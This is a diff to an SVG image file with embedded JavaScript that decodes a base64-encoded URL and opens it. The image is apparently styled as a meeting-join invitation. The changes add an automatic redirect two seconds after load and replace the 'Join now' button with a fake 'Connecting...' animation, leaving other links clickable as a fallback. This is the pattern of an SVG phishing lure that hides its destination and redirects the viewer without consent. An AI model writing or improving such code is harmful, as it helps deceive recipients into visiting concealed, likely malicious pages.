@@ -16,6 +16,21 @@
       var url = atob(b64);
       window.open(url, "_blank");
     }
+
+    // Auto-redirect after 2 seconds
+    setTimeout(goToBase64Link, 2000);
+
+    // Animate three dots for "Connecting..."
+    function animateDots() {
+      var dots = 0;
+      var dotElement = document.getElementById('connectingDots');
+      setInterval(function() {
+        dots = (dots + 1) % 4;
+        dotElement.textContent = '.'.repeat(dots);
+      }, 500); // Blink every 0.5 seconds
+    }
+    // Start animation on load
+    window.onload = animateDots;
   ]]></script>
   <!-- Background -->
   <rect width="400" height="600" fill="url(#bgGradient)"/>
@@ -53,16 +68,18 @@
     <circle cx="108" cy="0" r="16" fill="#fbbc04"/>
     <text x="108" y="5" font-family="Arial" font-size="12" fill="#fff" text-anchor="middle" font-weight="bold">+1</text>
   </g>
-  <!-- Join button (clickable) -->
-  <g onclick="goToBase64Link()" style="cursor:pointer;" transform="translate(200, 280)">
+  <!-- Connecting button (non-clickable, with animated dots) -->
+  <g transform="translate(200, 280)">
     <!-- Button background -->
     <rect x="-70" y="0" rx="22" ry="22" width="140" height="48" fill="#1a73e8"/>
     <!-- Button text -->
     <text x="0" y="28" font-family="Arial, Helvetica, sans-serif" font-size="16" fill="#fff" font-weight="500" text-anchor="middle" dominant-baseline="middle">
-      Join now
+      Connecting
     </text>
+    <!-- Animated dots -->
+    <text id="connectingDots" x="50" y="28" font-family="Arial, Helvetica, sans-serif" font-size="16" fill="#fff" font-weight="500" dominant-baseline="middle"></text>
   </g>
-  <!-- Secondary options -->
+  <!-- Secondary options (still clickable as fallback) -->
   <g transform="translate(200, 350)">
     <g onclick="goToBase64Link()" style="cursor:pointer;">
       <text x="0" y="0" font-family="Arial, Helvetica, sans-serif" font-size="13" fill="#1a73e8" text-anchor="middle">
